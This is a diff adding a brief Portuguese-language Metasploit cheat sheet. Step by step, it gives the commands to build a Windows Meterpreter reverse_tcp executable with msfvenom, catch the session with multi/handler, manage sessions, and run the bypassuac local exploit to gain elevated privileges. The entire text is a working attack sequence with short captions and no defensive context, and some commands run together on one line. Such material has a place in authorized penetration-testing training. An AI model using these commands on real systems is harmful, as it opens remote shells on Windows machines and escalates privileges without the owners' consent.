@@ -1,0 +1,63 @@
+Abrindo o Msfvenom:
+
+# msfvenom -h
+ 
+
+Criando Payload Meterpreter para Windows:
+
+# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=<ip_local> LPORT=<porta> -f exe -o payload.exe
+ 
+
+Abrindo o Metasploit Framework Console:
+
+# msfconsole
+ 
+
+Utilizando o handler:
+
+use exploit/multi/handler
+ 
+
+Selecionando o Meterpreter:
+
+set payload windows/meterpreter/reverse_tcp
+ 
+
+Configurando payload
+
+set LHOST <ip_local>set LPORT <porta>
+ 
+
+Executando handler para executar na porta
+
+exploit
+ 
+
+Saindo para backgraound
+
+background
+ 
+
+Listando sessões abertas
+
+sessions
+ 
+
+Entrando em sessão
+
+sessions -i <ID>
+ 
+
+Escolhendo bypassuac
+
+use exploit/windows/local/bypassuac
+ 
+
+Configurando bypassuac
+
+set LHOST <ip_local>set LPORT <porta>set session <ID session>
+ 
+
+Explorando:
+
+exploit
